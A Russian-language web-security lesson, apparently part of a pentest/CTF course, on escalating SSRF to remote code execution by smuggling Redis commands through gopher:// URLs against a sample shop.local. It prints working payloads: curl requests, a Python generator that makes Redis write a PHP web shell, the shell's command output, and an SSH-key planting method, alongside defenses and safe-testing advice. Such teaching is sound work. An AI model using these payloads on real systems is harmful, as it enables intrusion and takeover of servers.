Обычная SSRF позволяет отправлять **HTTP**-запросы внутренним сервисам. Но многие внутренние сервисы говорят не на HTTP, а на своих протоколах: Redis, Memcached, MySQL, FastCGI. Если SSRF умеет схему `gopher://`, она может передать на их порт **произвольные байты** — а значит, поговорить с ними на их языке. Это и есть **протокольная контрабанда**, и она часто превращает «просто SSRF» в полноценный RCE.

Возьмём `shop.local` с уже известной SSRF-ручкой и дойдём до выполнения команд.

## Наш пример: SSRF-ручка и внутренний Redis

Напомним: параметр `url` заставляет сервер сделать запрос. Обычная SSRF по HTTP мы уже умеем. Теперь проверим, какие **схемы** поддерживает библиотека запросов. Часто она разрешает не только `http`, но и `gopher`, `dict`, `file`. Попробуем `gopher` на Redis, который обычно слушает `127.0.0.1:6379`:

```bash
$ curl -s 'https://shop.local/profile/avatar' \
  -d 'url=gopher://127.0.0.1:6379/_PING'
{"error":"... +PONG ..."}
```

`+PONG` — ответ Redis. Значит, схема работает, и мы говорим с Redis напрямую.

## Шаг 1: как кодировать протокол в gopher

Redis — текстовый протокол: команды разделяются `\r\n` (перевод строки). Формат `gopher://host:port/_<данные>` передаёт `<данные>` как есть. Значит, команду `PING\r\n` надо закодировать в URL. Например, `INFO` выглядит так:

```
gopher://127.0.0.1:6379/_INFO%0d%0a
```

Здесь `%0d%0a` — это `\r\n`. Мы буквально «печатаем» байты, которые Redis ждёт от клиента. Именно в этом сила `gopher`: он не ограничивает нас HTTP-заголовками.

## Шаг 2: чем опасен Redis

Redis — это хранилище «ключ-значение», но у него есть команды, которые **пишут файлы на диск** и **загружают модули**. Два классических пути к RCE:

**Путь A — записать SSH-ключ.** Redis умеет сохранять базу в файл по указанному пути (`CONFIG SET dir`, `CONFIG SET dbfilename`). Мы:
1. задаём папку `/root/.ssh/` и имя файла `authorized_keys`;
2. кладём «значение» — свой публичный SSH-ключ;
3. вызываем `SAVE` — Redis записывает наш ключ в файл.

После этого входим по SSH без пароля.

**Путь B — записать веб-шелл.** Если знаем корень сайта, пишем туда `shell.php` с PHP-кодом.

## Шаг 3: собираем payload для Redis

Сформируем последовательность команд и закодируем её в gopher. Удобно собрать в Python, чтобы не путаться с `\r\n`:

```python
import urllib.parse
cmds = [
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    'SET x "<?php system($_GET[\'c\']); ?>"',
    "SAVE",
]
payload = "".join(c + "\r\n" for c in cmds)
print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload))
```

Получаем строку, которую подставляем в `url`:

```bash
$ curl -s 'https://shop.local/profile/avatar' \
  --data-urlencode 'url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a...'
{"error":"+OK"}
```

Redis по очереди выполнил команды и записал файл. Проверяем, что шелл появился:

```bash
$ curl -s 'https://shop.local/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

SSRF превратился в RCE. Мы не загружали файл через форму — мы попросили Redis записать его за нас.

## Шаг 4: другие протоколы и сервисы

`gopher` — не единственный. Полезны:

- **`dict://`** — простой протокол; иногда позволяет слать команды на сервисы, которые не принимают HTTP.
- **`file://`** — чтение локальных файлов напрямую.
- **FastCGI (порт 9000):** PHP-FPM слушает FastCGI; через gopher можно собрать бинарный пакет FastCGI и выполнить PHP-код.
- **MySQL (3306):** если у сервера есть доступ к БД, через gopher иногда проводят запросы (сложнее из-за бинарного протокола).
- **Memcached (11211):** текстовый протокол, может использоваться для подделки данных.

Каждый сервис — это отдельная цель: главное, что SSRF-схема позволяет говорить на его языке.

## Шаг 5: как понять, что схема доступна

Не все библиотеки поддерживают `gopher`. Признаки:

- **Ошибка про схему:** `unsupported protocol scheme "gopher"` — значит, схема запрещена.
- **Ошибка про соединение:** `connection refused` — схема принята, но порт закрыт.
- **Ответ сервиса** (`+PONG` от Redis) — схема работает.

Проверяй по очереди `gopher`, `dict`, `file`, `http` — и смотри, как меняется ошибка. Иногда разработчики запрещают `gopher` явно, но забывают про `dict`.

## Шаг 6: защита и почему она слабая

Правильная защита — не пускать SSRF-ручку на не-HTTP-схемы и ограничить внутреннюю сеть. На практике забывают:

- **Allowlist схем.** Если разрешены только `http`/`https` — контрабанда закрыта; но многие библиотеки по умолчанию берут всё.
- **Сетевой egress.** Если сервер не может ходить на `127.0.0.1:6379` — даже gopher не поможет.
- **Аутентификация сервисов.** Redis без пароля — половина беды; с паролем payload сложнее.

Отсюда вывод: протокольная контрабанда живёт там, где SSRF совпала с внутренним сервисом без пароля и без сетевых ограничений.

## Шаг 7: почему это называется «контрабандой»

Слово «контрабанда» здесь не случайно. Внешне мы отправляем обычный HTTP-запрос к легитимному эндпоинту — он выглядит как всё остальное. Но внутри, в параметре `url`, спрятана полезная нагрузка для **другого** протокола. Пограничный контроль (фильтр URL) видит «безобидный» gopher-адрес и пропускает его, а внутренний сервис получает команды на своём языке. Это контрабанда смысла: содержимое запроса — не то, чем оно кажется по форме.

Именно поэтому фильтры по «плохим» словам (`127.0.0.1`, `169.254.169.254`) не спасают: они проверяют адрес, а не то, **что** мы передаём на этот адрес. Даже если адрес разрешён (например, это внутренний сервис, к которому приложение ходит легитимно), через него можно провести неожиданные команды.

## Шаг 8: как безопасно проверять (и не сломать сервис)

Эксплуатация внутренних сервисов опасна: команды вроде `SAVE` в Redis, `CONFIG SET`, записи в базу могут **изменить состояние** и уронить прод. Поэтому:

- **Начинай с чтения**, а не записи: `PING`, `INFO`, `KEYS` — они безвредны и подтверждают доступ.
- **Не запускай `FLUSHALL`/`CONFIG REWRITE`** — это уничтожит данные.
- **Для записи файла** выбирай не критичный путь (лучше тестовый каталог), а не `/etc/` или боевой корень.
- **Согласуй с владельцем**, если действие меняет данные или может положить сервис.

Так ты докажешь impact, не оставив после себя разрушений. Хороший отчёт — это доступ плюс аккуратность, а не «я снёс Redis и получил RCE».

## Что мы теперь знаем

- `gopher://` передаёт произвольные байты → можно говорить на языке внутренних сервисов.
- Redis через gopher → запись файла (SSH-ключ, веб-шелл) → RCE.
- Аналогично: FastCGI/PHP-FPM, MySQL, Memcached, `dict://`.
- Признаки: ответ сервиса = работает; «unsupported scheme» = закрыто.
- Защита: allowlist схем + сетевой egress + пароли на сервисах.

## На что смотреть дальше

- **Открытый Redis** — самая частая и лёгкая цель; проверь `6379` через SSRF первым.
- **PHP-FPM на 9000** — если сайт на PHP, FastCGI-пакет даёт RCE.
- **Не забудь про запись файлов:** `dir`/`dbfilename` в Redis, `CONFIG SET` и `SAVE`.
- **Читай ответы сервиса:** `+OK`, `+PONG`, `-ERR` рассказывают, что происходит.

## Куда дальше

Мы научились говорить с Redis и превращать SSRF в RCE. Но похожие трюки есть и внутри PHP — специальные «обёртки», которые читают исходники и исполняют код. Об этом — урок `web-php-wrappers`. А пока запомни: **если SSRF умеет gopher и внутри есть сервис без пароля — считай, у тебя RCE.**

## Где пригодится

- **CTF (Web):** SSRF→gopher→Redis — классический путь к флагу через RCE.
- **Bug bounty:** протокольная контрабанда — сильное доказательство impact для SSRF-отчёта.
- **Пентест:** проверка внутренних сервисов (Redis, PHP-FPM) на доступность через SSRF.
- **Работа (AppSec):** пароли на внутренних сервисах, egress-фильтр, allowlist схем запросов.
